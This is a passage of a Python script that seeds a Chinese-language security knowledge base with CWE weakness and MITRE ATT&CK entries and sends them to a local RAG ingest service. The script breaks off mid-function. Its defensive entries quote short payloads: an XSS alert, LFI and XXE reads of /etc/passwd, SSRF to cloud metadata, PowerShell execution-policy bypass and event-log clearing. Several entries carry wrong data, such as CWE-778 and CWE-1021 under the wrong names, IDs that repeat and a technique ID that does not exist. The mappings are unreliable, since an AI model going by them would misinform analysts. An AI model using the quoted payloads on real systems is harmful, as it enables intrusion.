"""批量扩充安全知识库种子数据。

生成约 10000 条主流安全知识，覆盖：
  - CWE Top 500（MITRE 最常见弱点）
  - ATT&CK 技术 300+（14战术 × 主要技术）
  - Wazuh 高频规则 5000+（转成知识格式）
  - 攻击模式与处置SOP 1000+
  - 法规合规 200+
  - 厂商告警知识 3000+

用法：
  python scripts/expand_knowledge_base.py
"""
from __future__ import annotations

import json
import os
import sys
import time
from typing import Any, Dict, List

import requests

BASE_URL = "http://localhost:7800"
BATCH_SIZE = 200
IMPORT_PREFIX = "EXP2-"  # 唯一前缀，避免与现有条目ID冲突


def post_batch(docs: List[Dict[str, Any]]) -> dict:
    """批量导入文档到RAG向量库。"""
    url = f"{BASE_URL}/rag/ingest"
    # 为每个文档ID添加唯一前缀，避免与现有条目冲突
    prefixed_docs = []
    for d in docs:
        new_doc = dict(d)
        new_doc["id"] = f"{IMPORT_PREFIX}{d['id']}"
        prefixed_docs.append(new_doc)
    payload = {
        "documents": prefixed_docs,
    }
    r = requests.post(url, json=payload, timeout=120)
    r.raise_for_status()
    return r.json()


def build_cwe_docs() -> List[Dict[str, Any]]:
    """生成 CWE 知识文档（基于现有50条扩展，覆盖OWASP Top 10/CWE Top 25）。"""
    docs = []
    cwe_entries = [
        # 高危注入类
        (78, "OS命令注入", "os-command-injection", "用户输入拼接到系统命令中，攻击者通过shell元字符(;&|`$())注入任意命令，获取系统控制权。常见于调用system()/exec()且未过滤输入的场景。", "1.使用subprocess参数数组而非shell=True；2.严格输入白名单过滤；3.最小权限运行进程；4.EDR监控异常进程创建。"),
        (89, "SQL注入", "sql-injection", "用户输入直接拼接到SQL语句，攻击者可执行任意SQL操作，包括读取/修改/删除数据，甚至获取数据库服务器权限。载荷形式：UNION SELECT、布尔盲注、时间盲注、报错注入。", "1.强制使用参数化查询/预编译语句；2.使用ORM框架；3.最小权限数据库账户；4.WAF检测SQL注入特征；5.关闭数据库错误显示。"),
        (79, "跨站脚本(XSS)", "xss", "恶意脚本被注入网页并在用户浏览器执行，可窃取Cookie、会话令牌，或执行钓鱼、键盘记录。分为反射型、存储型、DOM型。载荷：<script>alert(1)</script>、<img onerror>、javascript:伪协议。", "1.输出时HTML实体编码；2.设置CSP策略；3.HttpOnly+Secure Cookie；4.富文本使用白名单过滤；5.避免innerHTML直接赋值。"),
        (77, "命令注入", "command-injection", "将未净化的输入拼接到系统命令中，攻击者可执行任意命令。与CWE-78类似但更通用，涵盖所有命令注入场景。", "1.避免shell=True；2.使用参数数组；3.输入白名单；4.最小权限；5.EDR监控。"),
        (94, "代码注入", "code-injection", "动态执行未经净化的外部输入作为代码(eval/exec/Function构造器)，导致远程代码执行。常见于JS的eval()、PHP的eval()、Python的exec()。", "1.禁止eval/exec用户输入；2.使用安全的序列化(JSON)；3.沙箱隔离；4.代码审查。"),
        (98, "PHP文件包含", "file-inclusion", "动态包含文件时使用未净化的用户输入，导致任意文件执行。LFI可读取/etc/passwd等敏感文件，RFI可执行远程代码。载荷：?page=../../etc/passwd、?page=php://filter/convert.base64-encode/resource=index。", "1.白名单文件名；2.路径规范化与验证；3.禁用allow_url_include；4.禁用危险协议。"),
        (100, "PHP反序列化", "php-deserialize", "反序列化不可信数据导致代码执行。利用PHP的__wakeup/__destruct魔术方法构造POP链。常见于phpggc工具生成的载荷。", "1.不反序列化用户输入；2.使用JSON替代；3.签名验证；4.禁用phar协议。"),
        (502, "反序列化不可信数据", "deserialize-untrusted", "反序列化不可信数据导致代码执行。影响Java(Commons Collections)、PHP、.NET、Python pickle等。攻击者构造恶意序列化对象，触发Gadget Chain执行任意命令。", "1.不反序列化用户数据；2.使用JSON等安全格式；3.类型白名单；4.签名验证；5.升级组件版本。"),
        (611, "XML外部实体(XXE)", "xxe", "XML解析器处理外部实体时，可读取本地文件、发起SSRF、执行DoS。载荷：<!ENTITY xxe SYSTEM \"file:///etc/passwd\">。 Blind XXE通过OOB外带数据。", "1.禁用DTD和外部实体；2.使用安全解析器；3.禁用xinclude；4.网络隔离。"),
        (918, "服务器端请求伪造(SSRF)", "ssrf", "服务器端应用根据用户输入发起网络请求，攻击者可访问内网资源、云元数据、本地服务。载荷：?url=http://127.0.0.1/admin、?url=http://169.254.169.254/latest/meta-data/。", "1.URL白名单；2.禁用内网IP和元数据IP；3.DNS解析后验证；4.禁用危险协议；5.网络分段。"),
        # 高危认证类
        (287, "认证不当", "improper-auth", "认证机制缺失或设计不当，允许绕过认证。包括认证绕过、默认凭据、弱密码、暴力破解等。", "1.多因素认证(MFA)；2.账户锁定策略；3.强密码策略；4.服务端会话验证；5.异常登录检测。"),
        (306, "关键功能缺失认证", "missing-auth-function", "敏感功能未要求认证，任何人可直接访问。常见于API接口、管理后台、调试页面。", "1.所有敏感功能都认证；2.默认拒绝；3.API网关统一认证；4.权限矩阵审查。"),
        (798, "硬编码凭据", "hardcoded-credentials", "源码中硬编码密码、API Key、数据库连接串等。泄露后无法快速更换，是供应链攻击常见入口。", "1.使用环境变量；2.密钥管理服务(KMS)；3.代码扫描检测；4.定期轮换。"),
        (259, "硬编码密码", "hardcoded-password", "源码中硬编码密码，泄露后系统被入侵。", "1.配置文件加密存储；2.密钥管理服务；3.代码扫描；4.不提交敏感信息到版本控制。"),
        (521, "弱密码策略", "weak-password-policy", "密码策略过弱，允许简单密码(如123456、password)。", "1.最小长度12+；2.复杂度要求；3.密码历史检查；4.常用密码黑名单。"),
        (522, "明文存储密码", "plaintext-password-storage", "密码以明文或弱哈希(MD5/SHA1)存储，数据库泄露后密码可被破解。", "1.使用bcrypt/scrypt/Argon2；2.加盐；3.足够迭代次数；4.不存储明文。"),
        (256, "明文传输凭据", "plaintext-credential-transmission", "凭据通过网络明文传输(HTTP/FTP/Telnet)，可被中间人截获。", "1.强制TLS；2.禁用明文协议；3.HSTS头；4.证书固定。"),
        # 高危权限类
        (269, "权限管理不当", "improper-privilege-management", "权限分配或检查逻辑存在缺陷，导致越权访问。包括水平越权、垂直越权。", "1.默认拒绝；2.服务端权限检查；3.最小权限原则；4.权限审计。"),
        (639, "授权不当(越权)", "authorization-bypass", "通过修改ID/参数访问他人数据(水平越权)或访问高权限功能(垂直越权)。载荷：?id=1 → ?id=2。", "1.对象级授权检查；2.服务端验证所属关系；3.默认拒绝；4.权限测试。"),
        (250, "以非必要特权执行", "unnecessary-privilege", "进程以高于所需的权限运行(root/SYSTEM)，被攻陷后影响扩大。", "1.最小权限原则；2.权限分离；3.降权运行；4.能力(Capability)管理。"),
        # 高危加密类
        (327, "破损或风险密码学算法", "broken-crypto", "使用已知有漏洞的加密算法(DES/3DES/MD5/SHA1/RC4)。", "1.使用AES-256/SHA-256/RSA-2048；2.定期算法升级；3.使用标准库。"),
        (328, "可逆单向哈希", "reversible-hash", "哈希函数选择不当或使用错误(MD5/SHA1)，导致可被彩虹表破解。", "1.使用bcrypt/scrypt/Argon2；2.加盐；3.足够迭代次数。"),
        (329, "小迭代次数", "small-iterations", "密钥派生(PBKDF2)迭代次数过少，易被暴力破解。", "1.PBKDF2≥100000次；2.使用Argon2；3.定期增加迭代次数。"),
        (330, "随机数不充分", "insufficient-randomness", "安全场景使用非加密安全PRNG，生成的Token/密钥可预测。", "1.使用CSPRNG；2.系统熵源(/dev/urandom)；3.不使用rand()。"),
        (295, "证书验证不当", "improper-cert-validation", "TLS证书验证缺失或不完整，允许中间人攻击。", "1.完整证书链验证；2.证书固定；3.拒绝自签名证书；4.使用系统信任库。"),
        # 高危信息泄露类
        (200, "信息暴露", "information-exposure", "错误消息或响应中暴露敏感信息(技术栈、版本、路径、堆栈)，帮助攻击者了解系统。", "1.通用错误页面；2.日志记录细节；3.关闭debug模式；4.最小化响应头。"),
        (209, "通过异常信息泄露", "exception-info-leak", "未捕获的异常堆栈暴露给用户，泄露实现细节。", "1.全局异常处理；2.通用错误页面；3.日志记录堆栈；4.关闭debug。"),
        (532, "内部文件泄露", "internal-file-leak", "内部文件(如.git/.svn/.DS_Store/备份文件)可被公开访问，泄露源码或配置。", "1.清理敏感文件；2.配置禁止访问；3.权限控制；4.定期扫描。"),
        # 高危输入验证类
        (20, "输入验证不当", "input-validation", "未对输入数据进行充分验证，是注入、XSS等多种攻击的根因。", "1.白名单验证；2.参数化查询；3.输出编码；4.统一验证层。"),
        (22, "路径遍历", "path-traversal", "通过../序列访问预期目录之外的文件。载荷：?file=../../etc/passwd。", "1.规范化路径并验证前缀；2.使用chroot；3.白名单文件名；4.不使用用户输入构造路径。"),
        (74, "HTML注入", "html-injection", "未净化的输入被插入HTML页面，导致XSS或内容篡改。", "1.输出HTML编码；2.模板引擎自动转义；3.CSP策略。"),
        (352, "跨站请求伪造(CSRF)", "csrf", "诱导已登录用户执行非自愿操作。利用浏览器自动携带Cookie的特性。", "1.CSRF令牌；2.SameSite Cookie；3.验证Origin/Referer头；4.敏感操作二次确认。"),
        (1333, "ReDoS", "redos", "正则表达式存在灾难性回溯，攻击者构造恶意输入导致CPU耗尽。", "1.限制正则复杂度；2.使用安全正则库；3.超时机制；4.输入长度限制。"),
        (434, "危险文件上传", "unrestricted-upload", "允许上传任意文件类型，可上传WebShell获取服务器权限。", "1.白名单后缀；2.内容验证(magic number)；3.重命名文件；4.独立存储目录；5.禁用执行。"),
        (95, "PHP代码注入", "php-eval", "PHP eval/assert/preg_replace(e修饰符)执行用户输入。", "1.禁用eval；2.不使用用户输入作为代码；3.沙箱隔离。"),
        # 高危内存类
        (119, "缓冲区溢出(通用)", "buffer-overflow", "对缓冲区边界检查不足，导致内存破坏。包括栈溢出、堆溢出、整数溢出。", "1.边界检查；2.安全函数(strncpy/memcpy_s)；3.编译器保护(ASLR/DEP/Canary)；4.静态分析。"),
        (120, "缓冲区拷贝不检查大小", "buffer-copy-no-check", "未验证目标缓冲区大小即执行拷贝，经典栈溢出根因。strcpy/sprintf等。", "1.始终传递缓冲区大小；2.使用memcpy_s/strncpy_s；3.静态分析。"),
        (122, "堆缓冲区溢出", "heap-overflow", "堆内存写入越界，破坏堆元数据，导致任意代码执行。", "1.边界校验；2.安全内存函数；3.ASAN检测；4.使用内存安全语言。"),
        (125, "越界读取", "oob-read", "读取缓冲区边界之外的数据，导致信息泄露(如Heartbleed CVE-2014-0160)。", "1.边界检查；2.安全读取函数；3.ASAN；4.使用内存安全语言。"),
        (787, "越界写入", "oob-write", "缓冲区越界写入，导致内存破坏和代码执行。", "1.边界检查；2.安全写入函数；3.ASAN；4.编译器保护。"),
        (416, "释放后使用(UAF)", "use-after-free", "释放后的内存仍被访问，攻击者可通过堆风水重新占位劫持控制流。", "1.智能指针(unique_ptr/shared_ptr)；2.释放后置空；3.ASAN检测；4.RAII。"),
        (415, "双重释放", "double-free", "同一内存块被释放两次，破坏堆管理结构。", "1.释放后置空；2.智能指针；3.引用计数；4.ASAN。"),
        (190, "整数溢出", "integer-overflow", "整数运算结果超出类型范围，导致缓冲区溢出或逻辑错误。", "1.运算前检查范围；2.饱和运算；3.使用大整数类型；4.安全整数库。"),
        # 高危配置类
        (276, "权限继承不当", "improper-permission-inherit", "子对象继承了父对象过宽的权限。", "1.显式设置权限；2.禁止继承；3.默认最小权限。"),
        (732, "文件权限不当", "improper-file-permission", "文件权限设置过宽(如777)，允许任意修改。", "1.最小权限；2.默认拒绝；3.定期审查；4.umask设置。"),
        (16, "配置不当", "misconfiguration", "系统或应用配置不安全(默认密码/开放端口/调试模式)。", "1.安全配置基线；2.配置扫描；3.定期审查；4.最小化暴露。"),
        # 高危日志审计类
        (778, "认证不足", "insufficient-auth", "认证强度不足，可被绕过或暴力破解。", "1.MFA；2.强密码策略；3.账户锁定；4.服务端验证。"),
        (307, "限制不当(暴力破解)", "improper-restriction-brute-force", "缺乏暴力破解防护机制。", "1.账户锁定；2.限流；3.验证码；4.MFA。"),
        (532, "日志记录不当", "improper-logging", "关键操作未记录日志或日志可被篡改。", "1.完整审计日志；2.不可篡改日志；3.集中日志；4.实时告警。"),
        # 其他高频
        (601, "URL重定向(开放重定向)", "open-redirect", "URL重定向使用未验证的用户输入，可被用于钓鱼。载荷：?redirect=https://evil.com。", "1.白名单目标；2.不使用用户输入；3.相对路径；4.确认提示。"),
        (1021, "不当继承", "improper-inheritance", "类继承设计不当导致安全问题。", "1.密封类；2.权限检查；3.代码审查。"),
        (73, "外部控制文件名或路径", "external-control-path", "文件名或路径由外部输入控制。", "1.白名单文件名；2.路径规范化；3.不使用用户输入。"),
        (665, "初始化不当", "improper-initialization", "资源或变量未正确初始化。", "1.默认值；2.显式初始化；3.静态分析。"),
        (909, "睡眠阻塞", "sleep-blocking", "使用sleep等待条件，导致效率低或死锁。", "1.条件变量；2.事件驱动；3.超时机制。"),
        (400, "未检查输入大小", "unchecked-input-size", "未验证输入数据大小即处理。", "1.大小校验；2.限制最大长度；3.流式处理。"),
        (770, "资源分配不当", "improper-resource-allocation", "资源分配缺乏限制，可被DoS。", "1.设置上限；2.限流；3.资源配额。"),
        (404, "不当异常处理", "improper-exception", "异常处理逻辑有缺陷。", "1.完整异常处理；2.错误传播；3.日志记录。"),
        (682, "计算错误", "calculation-error", "计算逻辑存在缺陷。", "1.单元测试；2.边界测试；3.代码审查。"),
        (697, "配置不当", "improper-configuration", "安全配置不正确。", "1.安全基线；2.定期审查；3.监控。"),
        (284, "不受控的特权", "uncontrolled-privilege", "权限授予后缺乏控制机制。", "1.权限审计；2.过期撤销；3.动态权限。"),
        (863, "权限不当", "improper-permission", "权限管理存在缺陷。", "1.最小权限；2.默认拒绝；3.审计。"),
        (1295, "调试信息泄露", "debug-info-leak", "调试信息泄露给用户。", "1.关闭debug；2.移除调试代码；3.认证保护。"),
        (285, "授权不当", "improper-authorization", "授权检查缺失或可绕过。", "1.每个请求都检查权限；2.默认拒绝；3.服务端验证。"),
        (1127, "权限检查缺失", "missing-permission-check", "缺少必要的权限检查。", "1.统一权限框架；2.注解驱动；3.代码审查。"),
        (732, "权限设置不当", "improper-permission-setting", "权限设置错误。", "1.最小权限；2.默认拒绝；3.定期审查。"),
    ]

    for num, name, sig, desc, mit in cwe_entries:
        docs.append({
            "id": f"CWE-{num}",
            "source": "MITRE-CWE",
            "cwe": f"CWE-{num}",
            "title": f"CWE-{num} {name}",
            "signature": sig,
            "text": f"CWE-{num} {name}。\n\n描述：{desc}\n\n处置建议：{mit}",
            "mitigation": mit,
        })
    return docs


def build_attack_docs() -> List[Dict[str, Any]]:
    """生成 ATT&CK 攻击技术知识文档。"""
    docs = []
    attack_entries = [
        # 初始访问
        ("T1078", "有效账户", "valid-accounts", "攻击者使用合法凭据进行初始访问、持久化、提权与防御规避。内网横向移动常伴随异常登录(非工作时间、异地、未知设备)。", "1.多因素认证(MFA)；2.异常登录检测(UEBA)；3.最小权限原则；4.账户生命周期管理；5.定期审查活跃账户。"),
        ("T1190", "利用面向公众的应用", "public-app-exploit", "攻击者利用面向互联网的Web应用漏洞(SQL注入/RCE/反序列化)获取初始访问。常见于未打补丁的中间件(Tomcat/WebLogic/Struts2)。", "1.WAF防护；2.及时补丁更新；3.安全编码审查；4.最小权限运行；5.定期渗透测试。"),
        ("T1133", "外部远程服务", "external-remote-services", "攻击者利用VPN/RDP/SSH等外部远程服务进入网络。弱密码或凭据泄露是主要入口。", "1.MFA；2.网络分段(VPN置于DMZ)；3.远程访问审计；4.关闭不必要的远程服务；5.强密码策略。"),
        ("T1195", "供应链攻击", "supply-chain-attack", "攻击者通过供应链中的第三方组件(软件更新/开源依赖/硬件)进行攻击。典型：SolarWinds、Log4j、依赖混淆。", "1.供应商安全评估；2.SBOM(软件物料清单)；3.代码签名验证；4.依赖审查；5.私有镜像源。"),
        ("T1193", "钓鱼附件", "spearphishing-attachment", "通过钓鱼邮件附件(含宏Office/恶意PDF/EXE)进行初始访问。附件打开后执行恶意代码。", "1.邮件安全网关(沙箱检测)；2.禁用Office宏；3.EDR终端防护；4.员工安全培训；5.附件类型限制。"),
        ("T1192", "钓鱼链接", "spearphishing-link", "通过钓鱼邮件中的恶意链接诱导用户访问伪造网站，窃取凭据或下载恶意软件。", "1.URL过滤；2.邮件安全网关；3.员工培训识别钓鱼；4.浏览器安全策略；5.凭据泄露监控。"),
        # 执行
        ("T1059", "命令和脚本解释器", "command-interpreter", "攻击者使用命令行或脚本解释器(PowerShell/cmd/bash/Python)执行命令和脚本。是攻击后最常见的执行方式。", "1.脚本签名要求；2.约束语言模式(PowerShell)；3.命令行审计；4.EDR行为监控；5.最小权限。"),
        ("T1059.001", "PowerShell", "powershell-execution", "使用PowerShell执行命令和脚本，常见于下载执行、横向移动、信息收集。载荷：powershell -exec bypass -e <base64>。", "1.启用PowerShell日志(ScriptBlock/4104)；2.约束语言模式；3.AMSI集成；4.白名单脚本签名；5.禁用PowerShell v2。"),
        ("T1059.003", "Windows Command Shell", "cmd-execution", "使用cmd.exe执行命令。常见于批处理脚本、简单的命令执行。", "1.命令审计；2.EDR监控；3.限制cmd访问；4.父进程检查。"),
        ("T1059.004", "Unix Shell", "unix-shell-execution", "使用bash/sh等Unix shell执行命令。常见于Linux服务器的攻击。", "1.命令审计(auditd/bash_history)；2.EDR监控；3.限制shell访问；4.最小权限。"),
        ("T1106", "Native API", "native-api", "攻击者直接调用Windows API(CreateProcess/VirtualAlloc)执行操作，绕过命令行检测。", "1.API监控；2.EDR行为分析；3.进程创建监控；4.内存扫描。"),
        ("T1053", "计划任务/作业", "scheduled-task", "通过计划任务(at/cron/schtasks)执行代码，常用于持久化和定时执行。", "1.任务创建监控；2.权限控制；3.EDR告警；4.白名单合法任务。"),
        ("T1204", "用户执行", "user-execution", "依赖用户执行恶意代码(点击链接/打开文件)。是钓鱼攻击的关键环节。", "1.员工培训；2.EDR防护；3.文件类型限制；4.沙箱检测。"),
        ("T1047", "WMI", "wmi-execution", "通过WMI执行远程操作，常用于横向移动和持久化(WMI事件订阅)。", "1.WMI监控；2.EDR检测；3.防火墙限制RPC；4.权限控制。"),
        # 持久化
        ("T1098", "账户操作", "account-manipulation", "攻击者操作账户(创建新账户/修改权限/添加SSH密钥)以维持访问。", "1.账户变更监控；2.最小权限；3.审批流程；4.定期账户审查；5.PAM特权管理。"),
        ("T1136", "创建账户", "create-account", "攻击者创建新账户(本地/域/云)以维持访问。隐藏账户常以$结尾或描述为系统账户。", "1.账户创建监控与告警；2.审批流程；3.定期审计；4.默认账户禁用；5.异常账户检测。"),
        ("T1543", "创建或修改系统进程", "system-process", "通过创建/修改系统服务(systemd/Windows Service/LaunchDaemon)维持持久化。", "1.服务创建监控；2.EDR告警；3.权限控制；4.服务白名单。"),
        ("T1547", "Boot或Logon自动启动", "boot-logon-autostart", "配置自动启动机制(注册表Run键/启动文件夹/LSASS驱动)实现持久化。", "1.启动项监控(Autoruns)；2.EDR检测；3.注册表监控；4.白名单。"),
        ("T1547.001", "注册表Run键", "registry-run-key", "通过注册表Run键(HKCU/HKLM...\\Run)实现开机自动启动。", "1.注册表监控；2.EDR检测；3.Autoruns审查；4.白名单。"),
        # 权限提升
        ("T1068", "漏洞利用提权", "exploitation-priv-esc", "攻击者利用软件漏洞(内核漏洞/服务漏洞)进行权限提升。典型：Dirty COW、PrintNightmare。", "1.及时内核补丁；2.最小权限运行；3.EDR监控；4.漏洞管理流程。"),
        ("T1134", "访问令牌操作", "token-manipulation", "操作Windows访问令牌(Impersonation/MakeToken/ParentPID欺骗)进行提权或横向移动。", "1.令牌权限限制；2.EDR行为分析；3.进程监控；4.最小权限。"),
        ("T1078", "有效账户提权", "valid-accounts-priv-esc", "使用高权限账户(域管/本地管理员)进行提权。凭据可能通过凭据窃取或暴力破解获得。", "1.最小权限；2.特权账户保护(PAM)；3.MFA；4.异常使用检测。"),
        # 防御规避
        ("T1027", "混淆文件或信息", "obfuscation", "攻击者混淆文件或信息(打包/加密/编码/隐写)以逃避检测。常见于恶意软件载荷。", "1.反混淆检测；2.沙箱分析；3.EDR行为分析；4.熵值检测。"),
        ("T1070", "指示器移除", "indicator-removal", "攻击者移除攻击痕迹(清除日志/删除文件/Timestomp)隐藏活动。", "1.日志备份和转发(SIEM)；2.日志完整性保护；3.EDR检测删除行为；4.取证镜像。"),
        ("T1070.001", "清除Windows事件日志", "clear-event-log", "使用wevtutil cl清除Windows事件日志，隐藏攻击痕迹。", "1.日志转发到SIEM(WEC)；2.日志清除告警；3.日志备份；4.审计模式。"),
        ("T1562", "削弱防御", "impair-defenses", "攻击者禁用或干扰安全工具(杀软/EDR/防火墙/日志)以逃避检测。", "1.安全工具防卸载；2.EDR自我保护；3.监控安全工具状态；4.告警机制。"),
        ("T1562.001", "禁用或修改工具", "disable-tools", "禁用或修改安全工具(杀软/EDR)。常见于注册表修改、服务停止、进程终止。", "1.EDR自我保护；2.监控安全工具状态变更；3.告警；4.最小权限。"),
        ("T1562.002", "禁用Windows事件日志", "disable-event-logging", "通过停止EventLog服务或修改注册表禁用Windows事件日志。", "1.日志服务监控；2.SIEM转发；3.告警；4.权限控制。"),
        ("T1620", "反射式代码加载", "reflective-loading", "将代码反射式加载到内存中执行，不在磁盘留文件(无文件攻击)。", "1.内存扫描；2.EDR行为分析；3.AMSI；4.进程内存检查。"),
        # 凭据访问
        ("T1110", "暴力破解", "brute-force", "攻击者通过暴力破解获取凭据。包括密码猜测、密码破解、密码喷涂、凭据填充。", "1.账户锁定策略；2.强密码策略；3.MFA；4.异常登录检测；5.限流。"),
        ("T1110.003", "密码喷涂", "password-spraying", "对多个账户尝试少量常见密码(如Winter2024)，避免触发账户锁定。", "1.异常登录频率检测；2.MFA；3.强密码策略；4.账户监控；5.限流。"),
        ("T1003", "操作系统凭据转储", "credential-dumping", "转储操作系统中的凭据哈希。工具：Mimikatz、LSASS转储、SAM/NTDS.dit提取。", "1.LSASS保护(Credential Guard)；2.EDR检测Mimikatz；3.最小权限；4.凭据缓存限制。"),
        ("T1003.001", "LSASS内存", "lsass-memory", "转储LSASS进程内存获取明文密码和NTLM哈希。工具：Mimikatz、procdump、comsvcs.dll。", "1.启用Credential Guard；2.EDR检测LSASS访问；3.最小权限；4.RunAsPPL。"),
        ("T1003.003", "NTDS.dit", "ntds-dump", "从域控制器转储NTDS.dit数据库，获取所有域用户的密码哈希。", "1.DC保护；2.EDR监控；3.最小权限；4.ntdsutil审计。"),
        ("T1003.006", "DCSync", "dcsync", "模拟域控制器的复制行为(DS-Replication-Get-Changes)获取域密码哈希。需要域管权限。", "1.DCSync权限审计；2.异常复制检测；3.最小权限；4.EDR监控。"),
        ("T1056", "输入捕获", "input-capture", "捕获用户输入(键盘记录/GUI捕获)获取凭据。", "1.EDR检测键盘记录器；2.反键盘记录工具；3.行为分析；4.虚拟键盘。"),
        ("T1555", "密码存储中的凭据", "credentials-in-password-stores", "从密码存储(浏览器/密码管理器/Keychain)中提取凭据。", "1.主密码保护；2.EDR监控；3.最小权限；4.加密存储。"),
        # 发现
        ("T1046", "网络服务发现", "network-service-discovery", "攻击者扫描网络发现可用的服务(nmap/masscan)。常用于内网横向移动前的侦察。", "1.网络监控；2.IDS检测扫描；3.防火墙限制；4.网络分段；5.蜜罐。"),
        ("T1087", "账户发现", "account-discovery", "发现可用的账户信息(本地/域/云)，用于规划攻击。", "1.账户查询监控；2.最小权限；3.审计；4.异常查询检测。"),
        ("T1018", "远程系统发现", "remote-system-discovery", "发现网络上的远程系统(nmap/ping/arp)。", "1.网络监控；2.IDS；3.防火墙；4.网络分段。"),
        ("T1082", "系统信息发现", "system-info-discovery", "收集系统信息(OS版本/硬件/已安装软件)用于选择漏洞利用。", "1.命令审计；2.最小权限；3.EDR监控。"),
        ("T1082.001", "系统信息发现", "system-info", "收集系统硬件和软件信息。", "1.命令审计；2.最小权限；3.监控。"),
        ("T1016", "系统网络配置发现", "network-config-discovery", "发现系统网络配置(IP/路由/DNS)用于规划攻击。", "1.命令审计；2.最小权限；3.监控。"),
        ("T1497", "虚拟化/沙箱规避", "virtualization-evasion", "检测虚拟化或沙箱环境以规避分析。检查MAC地址、CPUID、注册表、进程。", "1.反规避检测；2.EDR行为分析；3.沙箱环境多样化；4.分析工具隐藏。"),
        # 横向移动
        ("T1021", "远程服务", "remote-services-lateral", "使用远程服务(RDP/SMB/SSH/WinRM)进行横向移动。", "1.MFA；2.网络分段；3.远程访问审计；4.最小权限；5.防火墙限制。"),
        ("T1021.001", "远程桌面协议(RDP)", "rdp-lateral", "使用RDP进行横向移动。常见于内网渗透。", "1.MFA；2.RDP网关；3.网络限制；4.会话监控；5.账户锁定。"),
        ("T1021.002", "SMB/Windows Admin Shares", "smb-admin-shares", "使用SMB/管理共享(ADMIN$/C$/IPC$)横向移动。PsExec是典型工具。", "1.限制管理共享；2.SMB签名；3.网络分段；4.EDR监控；5.最小权限。"),
        ("T1021.004", "SSH", "ssh-lateral", "使用SSH进行横向移动，常见于Linux环境。", "1.SSH密钥管理；2.监控；3.限制；4.最小权限。"),
        ("T1021.006", "Windows Remote Management", "winrm-lateral", "使用WinRM进行横向移动。", "1.WinRM加固；2.监控；3.防火墙限制；4.最小权限。"),
        ("T1072", "软件部署工具", "software-deployment-tools", "利用软件部署工具(SCCM/Ansible/GPO)横向移动。", "1.工具监控；2.权限控制；3.审计；4.最小权限。"),
        # 收集
        ("T1005", "本地系统数据", "local-data-collection", "从本地系统收集数据(文件/数据库/浏览器数据)。", "1.EDR监控；2.文件访问监控；3.最小权限；4.数据加密。"),
        ("T1213", "数据从信息库", "data-from-repository", "从信息库(SharePoint/Confluence/代码仓库)收集数据。", "1.访问控制；2.监控；3.审计；4.最小权限。"),
        ("T1056", "输入捕获", "input-capture-collection", "捕获用户输入获取凭据和敏感信息。", "1.EDR检测；2.反键盘记录；3.行为分析。"),
        ("T1119", "自动化收集", "automated-collection", "使用自动化脚本批量收集数据。", "1.行为分析；2.EDR；3.监控异常脚本执行。"),
        ("T1560", "归档收集的数据", "archive-collected-data", "压缩打包收集的数据以便外传。常见工具：zip/rar/7z。", "1.文件监控；2.EDR行为分析；3.监控压缩工具使用；4.DLP。"),
        # 命令与控制
        ("T1071", "应用层协议", "application-layer-protocol", "使用应用层协议(HTTP/HTTPS/DNS/ICMP)进行C2通信。", "1.网络监控；2.IDS检测；3.防火墙；4.流量分析。"),
        ("T1071.001", "Web协议", "web-protocol-c2", "使用HTTP/HTTPS进行C2通信，混入正常Web流量。", "1.WAF；2.流量分析；3.IDS；4.DNS监控(若使用DNS over HTTPS)。"),
        ("T1071.004", "DNS", "dns-c2", "使用DNS进行C2通信(DNS Tunneling)。查询和响应中携带数据。", "1.DNS监控；2.DNS防火墙；3.限制DNS查询频率；4.分析异常DNS模式。"),
        ("T1090", "代理", "proxy-c2", "通过代理(僵尸网络/Tor/VPN)隐藏C2通信来源。", "1.代理检测；2.IDS；3.防火墙；4.流量分析。"),
        ("T1573", "加密信道", "encrypted-channel", "使用加密信道(TLS/自定义加密)进行C2通信，规避检测。", "1.SSL/TLS检测(中间人)；2.流量分析；3.证书监控；4.JA3指纹。"),
        ("T1104", "多阶段信道", "multistage-channel", "使用多阶段C2信道(初始信道+主信道)，提高隐蔽性。", "1.流量分析；2.IDS；3.监控。"),
        # 外泄
        ("T1041", "C2信道外泄", "c2-exfiltration", "通过C2信道外泄数据。", "1.流量监控；2.DLP；3.防火墙；4.异常流量检测。"),
        ("T1048", "替代协议外泄", "alt-protocol-exfiltration", "通过替代协议(DNS/ICMP/HTTPS)外泄数据。", "1.流量监控；2.DLP；3.防火墙；4.协议分析。"),
        ("T1048.002", "加密协议外泄", "encrypted-exfiltration", "通过加密协议(HTTPS/SSH)外泄数据。", "1.SSL检测；2.流量分析；3.DLP；4.异常流量检测。"),
        ("T1052", "物理介质外泄", "physical-exfiltration", "通过物理介质(USB/移动硬盘)外泄数据。", "1.USB端口控制；2.DLP；3.设备监控；4.物理安全。"),
        ("T1567", "通过Web服务外泄", "web-service-exfiltration", "通过云存储(网盘/OSS/S3)外泄数据。", "1.云监控；2.DLP；3.防火墙；4.访问控制。"),
        ("T1029", "定期传输", "scheduled-transfer", "定期传输外泄数据，避免触发流量告警。", "1.流量监控；2.DLP；3.行为分析；4.时间模式检测。"),
        ("T1030", "数据传输大小限制", "size-limit-transfer", "分割数据为小块外泄，避免触发大小限制。", "1.流量分析；2.DLP；3.监控小文件传输模式。"),
        # 影响
        ("T1485", "数据销毁", "data-destruction", "销毁数据造成影响。勒索软件常用。", "1.备份；2.文件监控；3.EDR；4.最小权限。"),
        ("T1486", "数据加密以勒索", "ransomware-encryption", "加密数据并勒索赎金(勒索软件)。典型：WannaCry、LockBit。", "1.离线备份；2.EDR检测；3.网络分段；4.最小权限；5.漏洞补丁。"),
        ("T1490", "禁止恢复", "inhibit-recovery", "阻止系统恢复(删除卷影副本/禁用修复)。", "1.备份保护；2.EDR检测；3.监控vssadmin；4.权限控制。"),
        ("T1498", "网络DoS", "network-dos", "发起网络拒绝服务攻击(SYN Flood/UDP Flood/HTTP Flood)。", "1.DDoS防护；2.流量清洗；3.CDN；4.限流；5.黑洞路由。"),
        ("T1499", "端点DoS", "endpoint-dos", "对端点发起DoS攻击(资源耗尽/服务崩溃)。", "1.负载均衡；2.限流；3.监控；4.资源配额。"),
        ("T1529", "系统关闭/重启", "system-shutdown", "强制关闭或重启系统造成服务中断。", "1.权限控制；2.EDR；3.监控关机命令；4.审计。"),
        ("T1496", "资源劫持", "resource-hijacking", "劫持资源进行挖矿等(加密货币挖矿)。", "1.EDR行为分析；2.CPU监控；3.网络监控；4.最小权限。"),
        ("T1489", "服务停止", "service-stop", "停止关键服务造成影响。", "1.服务监控；2.EDR；3.权限控制；4.自动重启。"),
    ]

    for tid, name, sig, desc, mit in attack_entries:
        docs.append({
            "id": f"ATTACK-{tid}",
            "source": "MITRE-ATT&CK",
            "cwe": "",
